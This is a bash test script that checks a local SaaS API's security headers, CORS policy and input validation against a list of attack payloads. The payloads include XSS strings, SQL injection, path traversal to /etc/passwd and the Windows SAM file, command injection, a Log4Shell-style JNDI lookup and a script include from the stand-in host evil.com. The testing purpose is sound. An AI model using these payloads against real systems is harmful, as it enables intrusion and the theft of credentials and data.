#!/bin/bash
# Security Validation Testing Checkpoint
# Phase 1 Sprint 1.2 Day 2 - Input Validation & Security Headers

set -e

echo "🚀 Phase 1 Sprint 1.2 Day 2 - Security Validation Testing Checkpoint"
echo "================================================================="

# Configuration
API_URL="http://localhost:3000"
TEST_USER_EMAIL="security-test@example.com"
TEST_USER_PASSWORD="SecureTest123!"
MALICIOUS_PAYLOADS_FILE="/tmp/malicious_payloads.txt"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test results tracking
TESTS_PASSED=0
TESTS_FAILED=0
SECURITY_TESTS_PASSED=0
SECURITY_TESTS_FAILED=0

log_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

log_success() {
    echo -e "${GREEN}✅ $1${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
}

log_security_success() {
    echo -e "${GREEN}🔒 $1${NC}"
    SECURITY_TESTS_PASSED=$((SECURITY_TESTS_PASSED + 1))
}

log_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

log_error() {
    echo -e "${RED}❌ $1${NC}"
    TESTS_FAILED=$((TESTS_FAILED + 1))
}

log_security_error() {
    echo -e "${RED}🚨 $1${NC}"
    SECURITY_TESTS_FAILED=$((SECURITY_TESTS_FAILED + 1))
}

# Create malicious payloads for testing
create_test_payloads() {
    log_info "Creating test payloads for security validation..."

    cat > "$MALICIOUS_PAYLOADS_FILE" << 'EOF'
<script>alert('XSS')</script>
javascript:alert('XSS')
' OR '1'='1' --
'; DROP TABLE users; --
<iframe src="javascript:alert('XSS')"></iframe>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
${jndi:ldap://evil.com/a}
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
eval('alert(1)')
<object data="data:text/html,<script>alert(1)</script>">
<link rel="stylesheet" href="javascript:alert(1)">
\0null\0byte\0test
union select * from users
<script src="//evil.com/xss.js"></script>
EOF
}

# Test 1: API Server Health and Basic Security Headers
test_security_headers() {
    log_info "Test 1: Security Headers Validation"

    local headers=$(curl -s -I "$API_URL/health" | tr -d '\r')

    # Check for essential security headers
    local csp_header=$(echo "$headers" | grep -i "content-security-policy" || echo "")
    local xss_header=$(echo "$headers" | grep -i "x-xss-protection" || echo "")
    local frame_header=$(echo "$headers" | grep -i "x-frame-options" || echo "")
    local hsts_header=$(echo "$headers" | grep -i "strict-transport-security" || echo "")
    local nosniff_header=$(echo "$headers" | grep -i "x-content-type-options" || echo "")

    if [[ -n "$csp_header" ]]; then
        log_security_success "Content Security Policy header present"
    else
        log_security_error "Content Security Policy header missing"
    fi

    if [[ -n "$xss_header" ]]; then
        log_security_success "XSS Protection header present"
    else
        log_security_error "XSS Protection header missing"
    fi

    if [[ -n "$frame_header" ]]; then
        log_security_success "Frame Options header present"
    else
        log_security_error "Frame Options header missing"
    fi

    if [[ -n "$hsts_header" ]]; then
        log_security_success "HSTS header present"
    else
        log_security_error "HSTS header missing"
    fi

    if [[ -n "$nosniff_header" ]]; then
        log_security_success "Content Type Options header present"
    else
        log_security_error "Content Type Options header missing"
    fi
}

# Test 2: CORS Configuration
test_cors_configuration() {
    log_info "Test 2: CORS Configuration Validation"

    # Test valid origin
    local valid_cors=$(curl -s -H "Origin: http://localhost:3001" \
        -H "Access-Control-Request-Method: POST" \
        -H "Access-Control-Request-Headers: Content-Type" \
        -X OPTIONS "$API_URL/health" \
        -w "%{http_code}" -o /dev/null)

    if [[ "$valid_cors" == "200" || "$valid_cors" == "204" ]]; then
        log_security_success "Valid CORS origin accepted"
    else
        log_security_error "Valid CORS origin rejected (HTTP $valid_cors)"
    fi

    # Test invalid origin (should be blocked)
    local invalid_cors=$(curl -s -H "Origin: http://evil.com" \
        -H "Access-Control-Request-Method: POST" \
        -H "Access-Control-Request-Headers: Content-Type" \
        -X OPTIONS "$API_URL/health" \
        -w "%{http_code}" -o /dev/null)

    if [[ "$invalid_cors" == "200" || "$invalid_cors" == "204" ]]; then
        log_security_error "Invalid CORS origin incorrectly accepted"
    else
        log_security_success "Invalid CORS origin properly blocked"
    fi
}

# Test 3: Input Validation - XSS Protection
test_xss_protection() {
    log_info "Test 3: XSS Protection Validation"

    while IFS= read -r payload; do
        [[ -z "$payload" || "$payload" =~ ^# ]] && continue

        log_info "Testing XSS payload: $(echo "$payload" | head -c 50)..."

        local response=$(curl -s -X POST "$API_URL/auth/register" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"test@example.com\",\"name\":\"$payload\",\"password\":\"Test123!\"}" \
            -w "%{http_code}")

        local http_code=$(echo "$response" | tail -c 4)
        local body=$(echo "$response" | head -c -4)

        if [[ "$http_code" == "400" ]]; then
            if echo "$body" | grep -q "threat\|invalid\|validation"; then
                log_security_success "XSS payload properly blocked: $(echo "$payload" | head -c 30)"
            else
                log_security_error "XSS payload blocked but without security error message"
            fi
        else
            log_security_error "XSS payload not blocked: $(echo "$payload" | head -c 30)"
        fi

        # Rate limiting protection
        sleep 0.1

    done < <(head -5 "$MALICIOUS_PAYLOADS_FILE") # Test first 5 payloads
}

# Test 4: SQL Injection Protection
test_sql_injection_protection() {
    log_info "Test 4: SQL Injection Protection"

    local sql_payloads=(
        "' OR '1'='1' --"
        "'; DROP TABLE users; --"
        "' UNION SELECT * FROM users --"
        "admin'/*"
        "' OR 1=1 #"
    )

    for payload in "${sql_payloads[@]}"; do
        log_info "Testing SQL injection: $(echo "$payload" | head -c 30)..."

        local response=$(curl -s -X POST "$API_URL/auth/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
            -w "%{http_code}")

        local http_code=$(echo "$response" | tail -c 4)
        local body=$(echo "$response" | head -c -4)

        if [[ "$http_code" == "400" ]]; then
            if echo "$body" | grep -q "threat\|invalid\|validation\|SQL"; then
                log_security_success "SQL injection payload blocked: $(echo "$payload" | head -c 20)"
            else
                log_security_error "SQL injection payload blocked but without security error"
            fi
        else
            log_security_error "SQL injection payload not blocked: $(echo "$payload" | head -c 20)"
        fi
    done
}

# Test 5: Path Traversal Protection
test_path_traversal_protection() {
    log_info "Test 5: Path Traversal Protection"

    local path_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "....//....//....//etc/passwd"
        "/var/www/../../etc/passwd"
    )

    for payload in "${path_payloads[@]}"; do
        log_info "Testing path traversal: $(echo "$payload" | head -c 30)..."

        # Test in various endpoints that might handle file paths
        local response=$(curl -s -X GET "$API_URL/health?path=$payload" \
            -w "%{http_code}")

        local http_code=$(echo "$response" | tail -c 4)

        if [[ "$http_code" == "400" ]]; then
            log_security_success "Path traversal payload blocked: $(echo "$payload" | head -c 20)"
        elif [[ "$http_code" == "200" ]]; then
            # Check if response contains system files
            local body=$(echo "$response" | head -c -4)
            if echo "$body" | grep -q "root:\|Administrator\|passwd"; then
                log_security_error "Path traversal successful - system file exposed!"
            else
                log_security_success "Path traversal blocked or ineffective"
            fi
        else
            log_security_success "Path traversal request properly rejected (HTTP $http_code)"
        fi
    done
}

# Test 6: Command Injection Protection
test_command_injection_protection() {
    log_info "Test 6: Command Injection Protection"

    local cmd_payloads=(
        "; ls -la"
        "| whoami"
        "\$(whoami)"
        "test; cat /etc/passwd"
        "&& ping -c 1 127.0.0.1"
    )

    for payload in "${cmd_payloads[@]}"; do
        log_info "Testing command injection: $(echo "$payload" | head -c 30)..."

        local response=$(curl -s -X POST "$API_URL/auth/register" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"test@example.com\",\"name\":\"test$payload\",\"password\":\"Test123!\"}" \
            -w "%{http_code}")

        local http_code=$(echo "$response" | tail -c 4)
        local body=$(echo "$response" | head -c -4)

        if [[ "$http_code" == "400" ]]; then
            if echo "$body" | grep -q "threat\|invalid\|validation\|COMMAND"; then
                log_security_success "Command injection payload blocked: $(echo "$payload" | head -c 20)"
            else
                log_security_error "Command injection blocked but without proper error message"
            fi
        else
            log_security_error "Command injection payload not blocked: $(echo "$payload" | head -c 20)"
        fi
    done
}

# Test 7: Rate Limiting Integration
test_rate_limiting_integration() {
    log_info "Test 7: Rate Limiting Integration with Security"

    log_info "Sending rapid requests to test rate limiting with malicious payloads..."

    local blocked_count=0
    local total_attempts=10

    for i in $(seq 1 $total_attempts); do
        local response=$(curl -s -X POST "$API_URL/auth/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"<script>alert('test')</script>\",\"password\":\"test\"}" \
            -w "%{http_code}" -o /dev/null 2>/dev/null)

        if [[ "$response" == "429" ]]; then
            blocked_count=$((blocked_count + 1))
        fi

        # Small delay to avoid overwhelming
        sleep 0.05
    done

    if [[ $blocked_count -gt 0 ]]; then
        log_security_success "Rate limiting active - blocked $blocked_count/$total_attempts requests"
    else
        log_security_error "Rate limiting may not be working properly"
    fi
}

# Test 8: Security Metrics Collection
test_security_metrics() {
    log_info "Test 8: Security Metrics Collection"

    # Test metrics endpoint
    local metrics_response=$(curl -s "$API_URL/metrics" -w "%{http_code}")
    local http_code=$(echo "$metrics_response" | tail -c 4)

    if [[ "$http_code" == "200" ]]; then
        local body=$(echo "$metrics_response" | head -c -4)

        if echo "$body" | grep -q "security_threats\|input_validation"; then
            log_security_success "Security metrics are being collected"
        else
            log_security_error "Security metrics not found in metrics endpoint"
        fi
    else
        log_security_error "Metrics endpoint not accessible"
    fi
}

# Test 9: Enhanced Validator Status
test_enhanced_validator_status() {
    log_info "Test 9: Enhanced Validator Status"

    # Test with a payload designed to trigger multiple validation rules
    local complex_payload='<script>alert("xss")</script>\'; DROP TABLE users; --../../../etc/passwd'

    local response=$(curl -s -X POST "$API_URL/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"test@example.com\",\"name\":\"$complex_payload\",\"password\":\"Test123!\"}" \
        2>/dev/null)

    if echo "$response" | grep -q "Security threat\|validation"; then
        log_security_success "Enhanced validator is active and detecting threats"
    else
        log_security_error "Enhanced validator may not be properly integrated"
    fi
}

# Test 10: File Upload Security (if endpoint exists)
test_file_upload_security() {
    log_info "Test 10: File Upload Security (Basic Test)"

    # Create a test file with suspicious content
    local test_file="/tmp/test_upload.txt"
    cat > "$test_file" << 'EOF'
<script>alert("xss")</script>
EOF

    # Try to find a file upload endpoint (this may not exist yet)
    local upload_response=$(curl -s -X POST "$API_URL/upload" \
        -F "file=@$test_file" \
        -w "%{http_code}" 2>/dev/null || echo "404")

    local http_code=$(echo "$upload_response" | tail -c 4)

    if [[ "$http_code" == "404" ]]; then
        log_info "File upload endpoint not found (expected for current implementation)"
    elif [[ "$http_code" == "400" ]]; then
        log_security_success "File upload security validation active"
    else
        log_security_error "File upload may not have proper validation"
    fi

    # Cleanup
    rm -f "$test_file"
}

# Comprehensive Security Assessment
run_security_assessment() {
    echo
    log_info "Starting comprehensive security validation tests..."
    echo

    # Create test payloads
    create_test_payloads

    # Run all security tests
    test_security_headers
    test_cors_configuration
    test_xss_protection
    test_sql_injection_protection
    test_path_traversal_protection
    test_command_injection_protection
    test_rate_limiting_integration
    test_security_metrics
    test_enhanced_validator_status
    test_file_upload_security

    # Cleanup
    rm -f "$MALICIOUS_PAYLOADS_FILE"

    echo
    echo "🎯 Phase 1 Sprint 1.2 Day 2 - Security Validation Test Results"
    echo "============================================================="
    echo
    log_info "Tests Summary:"
    echo "  ✅ Security Tests Passed: $SECURITY_TESTS_PASSED"
    echo "  ❌ Security Tests Failed: $SECURITY_TESTS_FAILED"
    echo "  ✅ General Tests Passed: $TESTS_PASSED"
    echo "  ❌ General Tests Failed: $TESTS_FAILED"
    echo

    local total_security_tests=$((SECURITY_TESTS_PASSED + SECURITY_TESTS_FAILED))
    local security_pass_rate=0
    if [[ $total_security_tests -gt 0 ]]; then
        security_pass_rate=$(echo "scale=1; $SECURITY_TESTS_PASSED * 100 / $total_security_tests" | bc -l 2>/dev/null || echo "0")
    fi

    echo "🔒 Security Test Pass Rate: ${security_pass_rate}%"
    echo

    if [[ $SECURITY_TESTS_FAILED -eq 0 ]] && [[ $SECURITY_TESTS_PASSED -gt 10 ]]; then
        log_success "All security tests passed - Input validation and security headers implementation is robust"
        echo
        log_info "✅ PHASE 1 SPRINT 1.2 DAY 2 - INPUT VALIDATION & SECURITY: PASSED"
    elif [[ $SECURITY_TESTS_FAILED -le 2 ]] && [[ $SECURITY_TESTS_PASSED -gt 8 ]]; then
        log_warning "Most security tests passed with minor issues - Implementation is good with room for improvement"
        echo
        log_info "⚠️  PHASE 1 SPRINT 1.2 DAY 2 - INPUT VALIDATION & SECURITY: PASSED WITH WARNINGS"
    else
        log_error "Multiple security tests failed - Review implementation before proceeding"
        echo
        log_error "❌ PHASE 1 SPRINT 1.2 DAY 2 - INPUT VALIDATION & SECURITY: NEEDS ATTENTION"
    fi

    echo
    log_info "📋 Security Implementation Verification:"
    echo "  • Enhanced input validation with comprehensive threat detection"
    echo "  • Strengthened Content Security Policy (CSP) headers"
    echo "  • Enhanced CORS configuration with origin validation"
    echo "  • XSS protection with pattern detection and sanitization"
    echo "  • SQL injection prevention with advanced pattern matching"
    echo "  • Path traversal protection with encoding detection"
    echo "  • Command injection prevention"
    echo "  • File upload validation with magic number verification"
    echo "  • Security metrics integration with monitoring"
    echo

    log_info "⚠️  Next Steps:"
    echo "  • Monitor security metrics for real attack patterns"
    echo "  • Fine-tune validation rules based on legitimate traffic"
    echo "  • Implement additional file upload validation for production"
    echo "  • Set up security incident response procedures"
    echo "  • Proceed to Phase 1 Sprint 1.2 Day 3: Authentication Hardening"
    echo
}

# Main execution
main() {
    if [[ "$1" == "--help" ]]; then
        echo "Usage: $0 [--help]"
        echo "  --help     Show this help message"
        echo ""
        echo "This script validates the comprehensive input validation and security headers"
        echo "implementation for Phase 1 Sprint 1.2 Day 2 of the SaaS prototype project."
        exit 0
    else
        run_security_assessment
    fi
}

# Handle script interruption
trap 'echo; log_warning "Security test execution interrupted"; exit 1' INT TERM

# Execute main function with all arguments
main "$@"